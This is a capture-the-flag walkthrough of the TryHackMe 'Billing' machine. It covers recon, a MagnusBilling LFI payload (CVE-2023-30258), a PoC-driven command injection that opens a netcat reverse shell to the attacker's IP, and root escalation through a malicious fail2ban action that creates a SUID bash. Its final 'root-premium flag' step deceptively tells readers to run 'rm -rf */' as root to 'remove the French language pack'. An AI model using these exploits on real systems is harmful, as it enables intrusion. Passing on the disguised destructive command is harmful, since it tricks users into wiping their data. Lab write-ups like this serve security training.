
Hi, here is how to successfully complete the machine https://tryhackme.com/room/billing
![2025-05-18_11-17](https://github.com/user-attachments/assets/9b88c7c6-bd1b-49ac-b2dc-0056c1579003)<br><br><br><br>

# Recon
A full TCP scan revealed several open ports on the target machine, providing valuable information about running services and possible attack vectors:<br>

Port 22 – SSH
The SSH service is running OpenSSH 8.4p1 on Debian 11. it's generally secure, it is important to keep this in mind for possible brute force or credential reuse .<br>

Port 80 – HTTP
Apache HTTP Server 2.4.56 is exposed on port 80. The Nmap scan also identified a robots.txt file disallowing access to /mbilling/, which suggests this could be a hidden or administrative web interface. The HTTP title confirms this, Title: MagnusBilling, This indicates the server is running MagnusBilling, an open-source VoIP billing solution, which may contain vulnerabilities or weak default credentials.

<pre><code>PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 79:ba:5d:23:35:b2:f0:25:d7:53:5e:c5:b9:af:c0:cc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCukT/TLi8Po4V6OZVI6yhgSlTaANGLErWG2Hqz9UOxX3XXMFvRe0uivnYlcvBwvSe09IcHjC6qczRgRjdqQOxF2XHUIFBgPjNOR3mb1kfWg5jKAGun6+J9atS8z+5d6CZuv0YWH6jGJTQ1YS9vGNuFvE3coJKSBYtNbpJgBApX67tCQ4YKenrG/AQddi3zZz3mMHN6QldivMC+NCFp+PozjjoJgD4WULCElDwW4IgWjq64bL3Y/+Ii/PnPfLufZwaJNy67TjKv1KKzW0ag2UxqgTjc85feWAxvdWKVoX5FIhCrYwi6Q23BpTDqLSXoJ3irVCdVAqHfyqR72emcEgoWaxseXn2R68SptxxrUcpoMYUXtO1/0MZszBJ5tv3FBfY3NmCeGNwA98JXnJEb+3A1FU/LLN+Ah/Rl40NhrYGRqJcvz/UPreE73G/wjY8LAUnvamR/ybAPDkO+OP47OjPnQwwbmAW6g6BInnx9Ls5XBwULmn0ubMPi6dNWtQDZ0/U=
|   256 4e:c3:34:af:00:b7:35:bc:9f:f5:b0:d2:aa:35:ae:34 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBVI/7v4DHnwY/FkhLBQ71076mt5xG/9agRtb+vldezX9vOC2UgKnU6N+ySrhLEx2snCFNJGG0dukytLDxxKIcw=
|   256 26:aa:17:e0:c8:2a:c9:d9:98:17:e4:8f:87:73:78:4d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII6ogE6DWtLYKAJo+wx+orTODOdYM23iJgDGE2l79ZBN
80/tcp   open  http     syn-ack ttl 63 Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title:             MagnusBilling        
|_Requested resource was http://10.10.98.226/mbilling/
3306/tcp open  mysql    syn-ack ttl 63 MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk syn-ack ttl 63 Asterisk Call Manager 2.10.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
<br><br>

Navigating to the web server hosted on port 80, we are presented with a login interface for MagnusBilling

The page is hosted under /mbilling/, as revealed earlier in the Nmap scan via robots.txt. This indicates that the directory was meant to be somewhat hidden from casual discovery, which could imply sensitive functionality or administrative access


![2025-05-18_11-28](https://github.com/user-attachments/assets/1c0de70b-a8a4-4c2e-a977-76af80def100)
<br><br>

To enumerate hidden directories within the /mbilling/ path, I used Gobuster with the medium-sized wordlist from SecLists.

Unfortunately, none of these directories had anything directly useful during manual review. However, the presence of /protected/ returning a 403 Forbidden may indicate an area of interest for future privilege escalation.
<pre><code>===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.102.9/mbilling/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /home/maxi/Escritorio/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 30s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 320] [--> http://10.10.102.9/mbilling/assets/]
/resources            (Status: 301) [Size: 323] [--> http://10.10.102.9/mbilling/resources/]
/archive              (Status: 301) [Size: 321] [--> http://10.10.102.9/mbilling/archive/]
/lib                  (Status: 301) [Size: 317] [--> http://10.10.102.9/mbilling/lib/]
/tmp                  (Status: 301) [Size: 317] [--> http://10.10.102.9/mbilling/tmp/]
/LICENSE              (Status: 200) [Size: 7652]
/protected            (Status: 403) [Size: 276]</code></pre>
<br><br>

While enumerating the MagnusBilling web interface, I discovered that the platform is affected by a critical vulnerability tracked as CVE-2023-30258. This vulnerability exists in version 6.0.1 of MagnusBilling and allows for unauthenticated local file inclusion (LFI) via a vulnerable lang parameter in the login page.<br>

The vulnerability stems from improper sanitization of user-supplied input in the lang parameter, which is intended to control the language selection for the web interface. By manipulating this parameter, an attacker can perform directory traversal to access sensitive files on the server. This can be tested with a payload like: "{target-ip}/mbilling/index.php?lang=../../../../../../etc/passwd"

If the server responds with the contents of /etc/passwd, it confirms that the vulnerability is present and exploitable. From this point, i can use LFI to retrieve various critical files, such as configuration files that may contain database credentials or application secrets. This greatly expands the attack surface, potentially allowing for access to other services such as MySQL, Asterisk, or even system-level user accounts.

![2025-05-18_20-37](https://github.com/user-attachments/assets/ca56f7f8-c49b-4629-becb-07c5ff874142)

# Explotation 
After confirming the existence of CVE-2023-30258, I explored further to determine if this vulnerability could lead to Remote Code Execution (RCE). I found a publicly available PoC on GitHub(https://github.com/n00o00b/CVE-2023-30258-RCE-POC), which demonstrates how to escalate the Local File Inclusion (LFI) vulnerability into full RCE.

The exploit works by abusing MagnusBilling’s handling of language files and PHP's include() behavior. The attacker crafts a fake language file on the target system, injects PHP code into it (such as a web shell or system command), and then uses the vulnerable lang parameter to include and execute that file. This effectively gives the attacker the ability to run arbitrary PHP code on the server, without authentication.

<br><br>

To exploit the vulnerability, I used the following command:
<pre><code>python poc.py -u http://{target-ip}/mbilling --cmd "nc -c sh {your-ip} {port}"</code></pre>
<br><br>

<pre><code>python poc.py -u http://10.10.174.135/mbilling --cmd "nc -c sh 92.8.1.160 1234"</code></pre>
<br><br>

Before executing this command, I set up a Netcat listener on my machine with:
<pre><code>maxi@maxi-notebook ~ [1]> nc -nlvp 1234</code></pre>
<br><br>

Once the PoC ran successfully, I received a connection on my listener, confirming that arbitrary commands were being executed remotely and that I had gained a reverse shell on the system.

This confirmed full RCE on the target, demonstrating the critical impact of this vulnerability. 
<pre><code>maxi@maxi-notebook ~/C/t/e/b/scripts> python poc.py -u http://10.10.102.9/mbilling --cmd "nc -c sh 10.9.1.162 1234"
Target URL: http://10.10.102.9/mbilling
Executing command: nc -c sh 10.9.1.162 1234
http://10.10.102.9/mbilling/lib/icepay/icepay.php?democ=;nc%20-c%20sh%2010.9.1.162%201234;sleep 2;</code></pre>
<br><br>

# User flag
From here, I was able to enumerate the system further and begin post-exploitation tasks, such as privilege escalation.
<pre><code>maxi@maxi-notebook ~ [1]> nc -nlvp 1234
Connection from 10.10.84.12:49316
whoami
asterisk</code></pre>
<br><br>

After gaining a reverse shell through the MagnusBilling RCE exploit, I was initially dropped into a very limited shell environment. To improve interactivity i upgraded the shell using Python’s pty module. This command spawns a fully interactive pseudo-terminal (/bin/bash) within the current session, allowing better interaction with the system.

Next, to ensure proper terminal display and functionality (especially for tools like nano, htop, or clear screen behavior), I exported the TERM environment variable
<pre><code>python3 -c 'import pty;pty.spawn("/bin/bash");'
asterisk@Billing:/var/www/html/mbilling/lib/icepay$ export TERM=xterm
export TERM=xterm
asterisk@Billing:/var/www/html/mbilling/lib/icepay$ ^Zfish: Job 1, 'nc -nlvp 1234' has stopped
maxi@maxi-notebook ~ [1]> stty raw -echo; fg
Send job 1 (nc -nlvp 1234) to foreground
ls                                      
ls
icepay-cc.php		icepay-ideal.php	icepay-phone.php  null
icepay-ddebit.php	icepay-mistercash.php	icepay-sms.php
icepay-directebank.php	icepay-paypal.php	icepay-wire.php
icepay-giropay.php	icepay-paysafecard.php	icepay.php
asterisk@Billing:/var/www/html/mbilling/lib/icepay$                </code></pre>
<br><br>


Once I had a stable shell, I started basic post-exploitation enumeration. I navigated to the /home directory and found a user directory named magnus. Accessing it revealed several typical user folders such as Desktop, Downloads, Documents, user.txt, and others.
<pre><code>asterisk@Billing:/home/magnus$ls
ls
Desktop    Downloads  Pictures	Templates  user.txt
Documents  Music      Public	Videos</code></pre>
<br><br>

# Root flag
I found that the asterisk user could run fail2ban-client as root without a password.
<pre><code>asterisk@Billing:/home/magnus$ sudo -l
sudo -l
Matching Defaults entries for asterisk on Billing:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on Billing:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client</code></pre>
<br><br>

This Python script is part of the Fail2Ban system — a tool used to protect servers from brute-force attacks by monitoring log files and banning malicious IP addresses.

When executed, it reads the arguments provided and runs the appropriate Fail2Ban functions, such as starting or stopping the service, checking jail statuses, or applying configuration changes
<pre><code># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Fail2Ban; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

"""
Fail2Ban reads log file that contains password failure report
and bans the corresponding IP addresses using firewall rules.

This tools starts/stops fail2ban server or does client/server communication,
to change/read parameters of the server or jails.

"""

__author__ = "Fail2Ban Developers"
__copyright__ = "Copyright (c) 2004-2008 Cyril Jaquier, 2012-2014 Yaroslav Halchenko, 2014-2016 Serg G. Brester"
__license__ = "GPL"

from fail2ban.client.fail2banclient import exec_command_line, sys

if __name__ == "__main__":
	exec_command_line(sys.argv)</code></pre>
<br><br>

We make a complete copy of the /etc/fail2ban directory in /tmp/fail2ban. This allows us to modify the configuration without affecting the system and prepare our own version of the Fail2Ban environment.
<pre><code>rsync -av /etc/fail2ban/ /tmp/fail2ban/
</code></pre>
<br><br>

The command cp /bin/bash /tmp/bash duplicates the standard Bash shell executable into the /tmp directory. This location is often writable by regular users, making it a convenient place to stage the payload.

chmod 755 /tmp/bash changes the permissions of the copied binary to be executable by everyone. This is necessary so that any user can run this shell.

chmod u+s /tmp/bash sets the SUID (Set User ID) bit on the copied binary. This is critical, as it causes the binary to execute with the permissions of its owner (typically root), rather than the permissions of the user who runs it. <br><br>

![2025-05-18_21-32](https://github.com/user-attachments/assets/85ee4a90-ad14-4fcb-a281-3ed2e7922c7b)

<br><br>

The command writes a new action definition to /tmp/fail2ban/action.d/custom-start-command.conf. This location typically contains action definitions used by Fail2Ban to perform specific actions when bans start or stop.

Within the file, the [Definition] section defines the action to be taken on service start

This means that when Fail2Ban starts, it will execute the /tmp/script file. Recall that /tmp/script is the script that copies the Bash shell, sets permissions, and enables the SUID bit.

A custom Fail2Ban action configuration is created by writing to /tmp/fail2ban/action.d/custom-start-command.conf, which instructs Fail2Ban to execute the /tmp/script upon service startup. This script copies the Bash shell and sets the SUID bit. By integrating this script into Fail2Ban’s startup routine, i ensure that the shell is created automatically whenever the service restarts.<br><br>


![2025-05-18_21-32](https://github.com/user-attachments/assets/ee928405-ca6c-4af8-acdd-e8fbfb766e03)

<br><br>


This command makes a new custom jail configuration to Fail2Ban’s jail.local file, enabling a jail named [my-custom-jail] with the previously defined custom action custom-start-command. By enabling this jail, Fail2Ban will trigger the custom action that runs the /tmp/script during its startup<br><br>


![2025-05-18_21-32](https://github.com/user-attachments/assets/a4ce8409-0fb8-4b8c-ad7d-30726ed5c0c1)

<br><br>

We create an empty filter with the name corresponding to the jail. Although we will not filter anything, Fail2Ban requires that the file exists in order not to throw errors.<br><br>

![2025-05-18_21-32](https://github.com/user-attachments/assets/7fd6f77c-0d24-4eb3-a129-6a711b593d0c)

<br><br>

Finally, we run fail2ban-client as root, telling it to use our modified configuration located in /tmp/fail2ban/. When the service is restarted, the jail is activated, which in turn executes our script.
<pre><code>sudo fail2ban-client -c /tmp/fail2ban/ -v restart
</code></pre>
<br><br>

if all went well, the /tmp directory contains a bash binary owned by root with the SUID bit set.

<pre><code>asterisk@Billing:/tmp$ ls -la
ls -la
total 1224
drwxrwxrwt  3 root     root        4096 May 18 13:54 .
drwxr-xr-x 19 root     root        4096 Mar 27  2024 ..
-rwsr-xr-x  1 root     root     1234376 May 18 13:54 bash
drwxr-xr-x  6 asterisk asterisk    4096 Mar 27  2024 fail2ban
-rwxr-xr-x  1 asterisk asterisk      73 May 18 13:54 script</code></pre>
<br><br>

The -p option preserves privileges. This gives us a shell with root permissions thanks to the SUID bit.
<pre><code>asterisk@Billing:/tmp$ ./bash -p

./bash -p
bash-5.1# 
bash-5.1# cd /root
cd /root
bash-5.1# ls
ls
filename  passwordMysql.log  root.txt
bash-5.1# </code></pre>
<br><br>

# Root-Premium flag
Do not forget to remove the French language pack from the system, otherwise, getting the root-premium flag will not be possible.
<pre><code>bash-5.1# rm -rf */
</code></pre>
<br><br>

Guess it’s time to explore with echo * instead.
<pre><code>bash-5.1# ls
ls
bash: /usr/bin/ls: No such file or directory</code></pre>
<br><br>
